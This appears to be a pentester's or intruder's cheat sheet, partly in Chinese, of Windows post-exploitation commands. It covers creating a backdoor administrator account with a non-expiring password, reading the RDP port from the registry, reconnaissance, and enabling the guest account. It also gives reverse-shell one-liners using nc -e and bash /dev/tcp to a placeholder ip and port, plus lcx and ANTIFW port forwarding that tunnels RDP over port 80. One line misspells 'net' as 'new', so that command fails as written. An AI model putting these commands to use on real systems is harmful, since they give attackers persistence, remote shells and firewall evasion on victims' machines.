### cmd_powershell_create_user
```Bash
Syntax of creating new users and grant them admin right (Powershell & CMD)

Bash

cmd.exe < run Administrator
net user /add [Username] [Password]
new localgroup Administrators [Username] /add

Powershell

NET USER [Username] [Password]/add /y /expires:never
NET LOCALGROUP Administrators [Username]/add
WMIC USERACCOUNT WHERE "Name='[Username]'" SET PasswordExpires=FALSE
```
### 查询终端端口 CMD Find 3389 PORT 得到16进制端口号
```Bash
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
```
### CMD
```Bash
systeminfo ：查看系统版本信息
netstat -ano : 查看系统开放端口
tasklist /svc : 查看系统进程
ipconfig : 查看ip地址
whoami : 查看当前用户
net user : 查看计算机用户列表
net localgroup : 查看计算机用户组列表
net user mstlab mstlab /add : 添加用户并设置密码
net localgroup administrators mstlab /add : 将用户加入管理组
net user guest /active:yes : 激活guest用户
net user guest mstlab : 更改guest用户的密码
```
### 反弹shell
```Bash
shell： nc -e cmd ip port
shell: bash -i >& /dev/tcp/ip/port 0>&1(linux)
服务器： nc -vv -lp port
```
### 端口转发
```Bash
shell: lcx -slave ip port 127.0.0.1 port
服务器： lcx -listen port 33891
ANTIFW.exe -s #运行程序，将3389转发到80
ANTIFW.exe -l #关闭程序，恢复iis
```